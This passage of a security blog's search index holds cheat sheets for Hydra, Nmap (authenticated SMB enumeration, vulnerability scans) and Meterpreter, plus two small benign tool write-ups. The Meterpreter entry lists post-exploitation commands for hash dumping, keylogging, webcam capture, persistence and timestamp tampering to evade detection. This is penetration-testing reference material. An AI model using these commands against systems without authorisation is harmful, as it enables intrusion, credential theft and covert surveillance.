\u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\nBasic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; Final Thoughts Nmap is a versatile and robust tool that adapts to a wide range of use cases, from simple port scans to detailed vulnerability assessments. Keep this cheat sheet handy for quick reference, and remember: the more you practice, the more efficient your scanning workflows will become!\n","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003cp\u003e\u003cstrong\u003eNmap\u003c/strong\u003e (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective—sometimes, that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go 